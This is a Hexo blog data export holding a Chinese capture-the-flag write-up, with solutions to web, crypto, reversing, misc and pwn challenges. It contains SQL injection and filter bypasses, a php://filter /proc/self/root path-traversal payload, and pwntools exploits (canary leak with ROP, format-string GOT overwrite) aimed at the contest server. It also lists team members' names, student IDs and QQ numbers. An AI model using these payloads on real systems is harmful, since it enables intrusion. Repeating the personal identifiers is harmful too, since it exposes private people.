{"meta":{"title":"Lcdm123","subtitle":"","description":"","author":"海马少年","url":"http://example.com","root":"/"},"pages":[],"posts":[{"title":"","slug":"CUMTCTF","date":"2020-10-11T10:55:54.619Z","updated":"2020-09-25T13:29:37.101Z","comments":true,"path":"2020/10/11/CUMTCTF/","link":"","permalink":"http://example.com/2020/10/11/CUMTCTF/","excerpt":"","text":"CUMT校赛青老年混和队：王海霖-08183058-76590656 李佳林-08182821-1094204503 ​ 陈志航-08182820-2556973060 罗冬冬-08193093-3256487081 [TOC] WEBweb签到步骤 打开发现需要GET传参但并未指明参数，多次尝试发现只需要传入?1即可； 传入发现需要post一个2，多次尝试发现并没有反应，于是使用burpsuite 在params里填好参数后发现2后面多了一个等号，然后就传参成功，并且发现php代码； 明显是使用PHP伪协议查看源文件即可获得flag base64解码即可 Babysqli使用burpsuite进行注入后发现空格被过滤了，使用/**/ 替代空格； 并且发现下方注释，猜测flag可能在password里面，使用SQL语句查询 发现flag，成功 Secret发现图片，并且下载图片，按文本格式打开，后发现php代码 进行代码审计，题目要求需要使用GET方式提交param1和param2,然后使用POST方式提交param1与 param2;file_get_contents($str1)是指需要str1以文件的形式写入值，is_numeric($str2)是判断str2是否为数字并且可以识别十进制和十六进制，str2需要等于2592000，sleep()函数是要程序沉睡一段时间，if(((string)$str1!==(string)$str2)&amp;&amp;(sha1($str1)===sha1($str2)))是指需要让str1与str2的字符串形式不同，并且经过sha1()后相同；绕过这些限制救可获得flag； 使用十六进制绕过sleep()函数； 使用data://text/plain;base64,U3V2aW5fd2FudHNfYV9naXJsZnJpZW5k向str2中写入内容 关于sha1()函数的绕过，网上查找到文章https://www.addon.pub/2017/10/13/CTF-sha1%E5%92%8CMD5/ Babysqli2按照传统试一试平常的注入语句，之后发现过滤了单引号，网上查询可使用斜杠转义前面的单引号； 绕过成功，但是只显示了登录成功信息，猜测多半是盲注；发现substr() mid() 等函数被过滤了，但是left()仍可以使用； 由于flag的开头为C 所以就尝试猜测flag在password中的位置 结果发现flag在第九行；之后便使用笨办法对flag进行逐个字母爆破，下方即为最终爆破结果，按照ascii码表转换为字母即可格式为 CUMTCTF{}，大括号内全为小写； 简单文件包含页面提示需要只支持本地请求，使用burpsuite，X-Forwarded-For：127.0.0.1 没有反应 然后尝试使用client-ip:127.0.0.1 成功； 发现使用了include_once()函数，并且使用了两次，该函数只能包含同一文件一次，继续网上查找方法；发现一个重复require_once()的函数的文章，是使用伪协议配合多级符号链接的办法进行绕过的； 1php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php base64解码即可 Crypto幼儿园的密码题脚本 已知n求p,q http://www.factordb.com/ n,e,c转成10进制 123456789101112import gmpy2p&#x3D;324350545929838254331191385863847627003q&#x3D;328413456989577256301798468872388310877n&#x3D;106521084065274837947153338013414677016150003618052696631715598225251903811631c&#x3D;40448992051548719008529549070468060415257485938698092782029814901918646701101e&#x3D;65537d &#x3D; gmpy2.invert(e,(p-1)*(q-1))key&#x3D;pow(c, d, n)print(d)print(key) 得出来的key转十六进制再转字符(真的真的很没意思) 小学生的密码题1234567891011121314151617181920212223242526from secret import flagdef encode(ptext):dic &#x3D; [chr(i) for i in range(ord(&quot;A&quot;), ord(&quot;&#125;&quot;) + 1)];dic&#x3D;&#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_&#39;abcdefghijklmnopqrstuvwxyz&#123;|&#125;~m &#x3D; [i for i in ptext] ;m&#x3D;flagtmp &#x3D; [];s &#x3D; [] 创建临时tmp和sfor i in range(len(m)): ;range(flag长度)for j in range(len(dic)): ;range(62)if m[i] &#x3D;&#x3D; dic[j]: ;flag[i]&#x3D;&#x3D;dic[j] 即为A到~时tmp.append(j + 1) ;tmp+&#x3D;j+1(相当于ord(dic[j])-63)for i in tmp: ;遍历tmp中的数res &#x3D; &quot;&quot;if i &gt;&#x3D; 8: i&gt;&#x3D;8(dic[j]&gt;&#x3D;71时)res +&#x3D; int(i&#x2F;8)*&quot;8&quot;if i%8 &gt;&#x3D;4: i%8&gt;&#x3D;4res +&#x3D; int(i%8&#x2F;4)*&quot;4&quot;if i%4 &gt;&#x3D;2:res +&#x3D; int(i%4&#x2F;2)*&quot;2&quot;if i%2 &gt;&#x3D; 1:res +&#x3D; int(i%2&#x2F;1)*&quot;1&quot;s.append(res + &quot;0&quot;)print (&quot;&quot;.join(s)[:-1])encode(flag) 硬算，算到一半发现加法就行，淦 脚本12345678a&#x3D;[2,20,12,19,2,19,5,58,24,46,52,30,32,49,36,30,17,40,38,39,51,60]b&#x3D;[67,85,77,84,67,84,70,123,89,111,117,95,97,114,101,95,82,105,103,104,116,125]flag&#x3D;&#39;&#39;for i in range(22):flag+&#x3D;chr(b[i])print(flag) a=上边一坨-1 b=a+65 得flag=CUMTCTF{You_are_Right} REre1 re2 脱壳机脱壳 re3从python字节码可看出是存入一个数组cipher，再与19异或得flag 脚本123456cipher&#x3D;[80,70,94,71,80,71,85,104,86,39,64,106,76,67,106,71,123,92,125,76,37,106,103,118,80,35,119,32,110]b&#x3D;&#39;&#39;for i in range(29):b+&#x3D;chr(cipher[i]^19)print(b) re4无壳，32位 加密函数 存在v15的字符 正向脚本 1234567891011v15&#x3D;[0x15,0x02,0x0A,0x16,0x13,0x0B,0x11,0x08,0x03,0x1B,0x19,0x21,0x12,0x1A,0x18,0x10,0x09,0x22,0x24,0x17,0x04,0x0E,0x0C,0x14,0x1E,0x00,0x1D,0x07,0x01,0x06,0x1F,0x0F,0x05,0x1C,0x0D,0x23,0x20,0x25]a&#x3D;&#39;eMl1_l1hT9_ldcoR3OC1CW0HhC_&#123;UF30Tp__l&#125;&#39;b&#x3D;&#39;&#39;for j in range(len(v15)):b+&#x3D;a[v15[j]]print(b) 其实a=flag[v15[j]] 逆向脚本不会写 再排序 Misc连签到都算不上 得 12345678910\\u81ea\\u7531\\u548c\\u8c10\\u5e73\\u7b49\\u5e73\\u7b49\\u81ea\\u7531\\u8bda\\u4fe1\\u548c\\u8c10\\u5e73\\u7b49\\u81ea\\u7531\\u81ea\\u7531\\u548c\\u8c10\\u5e73\\u7b49\\u81ea\\u7531\\u81ea\\u7531\\u516c\\u6b63\\u6cd5\\u6cbb\\u53cb\\u5584\\u5e73\\u7b49\\u5e73\\u7b49\\u6cd5\\u6cbb\\u548c\\u8c10\\u548c\\u8c10\\u516c\\u6b63\\u8bda\\u4fe1\\u6587\\u660e\\u516c\\u6b63\\u548c\\u8c10\\u548c\\u8c10\\u5bcc\\u5f3a\\u516c\\u6b63\\u8bda\\u4fe1\\u548c\\u8c10\\u548c\\u8c10\\u548c\\u8c10\\u5e73\\u7b49\\u8bda\\u4fe1\\u5e73\\u7b49\\u548c\\u8c10\\u6587\\u660e\\u5e73\\u7b49\\u8bda\\u4fe1\\u5e73\\u7b49\\u81ea\\u7531\\u548c\\u8c10\\u5e73\\u7b49\\u81ea\\u7531\\u81ea\\u7531\\u516c\\u6b63\\u6587\\u660e\\u6c11\\u4e3b\\u6cd5\\u6cbb\\u8bda\\u4fe1\\u548c\\u8c10\\u000d\\u000a 继续转 继续转 真签到题 大鲨鱼之你可劲找这题真的很恶心 先搜索flag，发现全是http 再缩小范围 这里可以看到是这样的sql语句 追踪http流 分为好几组，每一组确定一个十进制数，一组有好几段，每段后面都有一串字符，根据不同 的字符判断是&gt;还是&lt;=，数就完事了， 脚本1234567a&#x3D;[99,101,99,99,49,51,57,52,45,54,49,51,51,45,52,51,100,48,45,98,101,48,54,45,97,52,49,99,53,102,50,51,49,100,100,52,125]b&#x3D;&#39;&#39;for i in range(len(a)):b+&#x3D;chr(a[i])print(b) 别做题了听歌吧 用MP3stego分离 得到这个 放入010editor 09为-，20为.，0D0A为\\转化摩斯密码 兔兔那么可爱以txt方式打开flag文件 斐波那契数列 脚本1234567891011121314151617181920212223filename&#x3D;&quot;C:&#x2F;&#x2F;Users&#x2F;lenovo&#x2F;Desktop&#x2F;Misc3&#x2F;flag.txt&quot;fp&#x3D;open(filename,&quot;r&quot;)content&#x3D;fp.read()fp.close()nterms &#x3D; int(input(&quot;你需要几项？&quot;))n1 &#x3D; 0n2 &#x3D; 1count &#x3D; 2if nterms &lt;&#x3D; 0:print(&quot;请输入一个正整数。&quot;)elif nterms &#x3D;&#x3D; 1:print(&quot;斐波那契数列：&quot;)print(n1)else:print(&quot;斐波那契数列：&quot;)print(n1, &quot;,&quot;, n2, end&#x3D;&quot; , &quot;)while count &lt; nterms:nth &#x3D; n1 + n2print(nth, end&#x3D;&quot; , &quot;)print(content[nth-1])n1 &#x3D; n2n2 &#x3D; nthcount +&#x3D; 1 得flag PWNtest_ncnc一下加qq要flag babystack当输入为1_love_y0u时拿到shell canary buf在rsp+10，v3在rsp+48，两个相距0x38，输入‘a’*0x38，泄露出来canary的值，但是要 减去换行符0xa，再通过ROPgadget找到sh的地址，构造payload。 123456789101112131415161718192021#!&#x2F;usr&#x2F;bin&#x2F;env python2#-*- coding:utf-8 -*from pwn import *context(arch&#x3D;&#39;amd64&#39;,os&#x3D;&#39;linux&#39;,log_level&#x3D;&#39;debug&#39;)r&#x3D;remote(&#39;202.119.201.197&#39;,10004)elf&#x3D;ELF(&#39;.&#x2F;canary&#39;)sys&#x3D;0x4005F0sh_addr&#x3D;0x0400904ret_rdi&#x3D;0x00000000004008e3r.recvuntil(&quot;Let&#39;s pwn it!&quot;)payload&#x3D;&#39;a&#39;*0x38r.sendline(payload)r.recvuntil(&#39;a&#39;*0x38)canary&#x3D;r.recv(8)canary&#x3D;canary.ljust(8,&#39;\\x00&#39;)canary&#x3D;u64(canary)-0xalog.info(&quot;canary:&quot;+hex(canary))payload&#x3D;&quot;\\x90&quot;*0x38+p64(canary)+&quot;\\x90&quot;*0x8+p64(sh_addr)+p64(sys)r.sendline(payload)r.recv()r.interactive() fmstr Gets（）不限制输入，printf处有格式化字符串漏洞，可以从中泄露出输入的偏移，然后用 fmstr_payload()把puts的got表中的内容改为backdoor的地址 1234567891011#!&#x2F;usr&#x2F;bin&#x2F;env python2#-*- coding:utf-8 -*from pwn import *from LibcSearcher import *r&#x3D;remote(&#39;202.119.201.197&#39;,10006)elf&#x3D;ELF(&#39;.&#x2F;fmstr&#39;)sys&#x3D;0x0804857Dputs_got&#x3D;elf.got[&#39;puts&#39;]payload&#x3D;fmtstr_payload(8,&#123;puts_got:sys&#125;)r.sendline(payload)r.interactive() babyrop buf实际在ebp-6c，但却要输入0x100，存在溢出，并没有在发现system（），但发现可以 通过泄露write的got表的内容得到write的实际地址，然后通过泄露出的地址的后三位查找 libc的版本 通过write的地址减去write的偏移得到libcbase，然后通过system的偏移计算其地址，/bin/sh的偏移计算其地址，最后构造payload","categories":[],"tags":[]},{"title":"Hello World","slug":"hello-world","date":"2020-10-11T09:21:30.465Z","updated":"2020-10-11T09:21:30.465Z","comments":true,"path":"2020/10/11/hello-world/","link":"","permalink":"http://example.com/2020/10/11/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}],"categories":[],"tags":[]}